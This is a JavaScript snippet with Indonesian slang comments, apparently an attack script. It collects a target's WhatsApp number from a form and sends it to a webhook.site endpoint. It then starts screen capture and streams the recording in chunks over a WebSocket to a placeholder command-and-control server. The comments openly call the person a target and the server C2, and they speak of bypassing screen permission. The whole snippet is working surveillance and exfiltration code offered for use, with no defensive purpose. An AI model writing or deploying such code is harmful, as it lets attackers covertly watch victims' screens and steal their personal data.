function kirimData() {
    const nomorWa = document.getElementById('wa').value;
    if(!nomorWa) {
        alert('Nomor wajib diisi!');
        return;
    }
    
    // Kirim data nomor WhatsApp target ke endpoint bot/server lu
    fetch('https://webhook.site/alamat-endpoint-lu', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ whatsapp: nomorWa })
    }).then(() => {
        // Pancing fungsi tangkap layar otomatis (WebRTC)
        mulaiMirrorLayar();
    });
}

async function mulaiMirrorLayar() {
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { mediaSource: "screen" },
            audio: false
        });
        
        // Hubungkan stream ke WebSocket C2 Server milik lu
        const ws = new WebSocket('wss://c2-server-lu.com:8080');
        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        
        recorder.ondataavailable = (e) => {
            if (e.data.size > 0 && ws.readyState === WebSocket.OPEN) {
                ws.send(e.data);
            }
        };
        recorder.start(1000);
    } catch (err) {
        console.error("Gagal bypass izin layar:", err);
    }
}
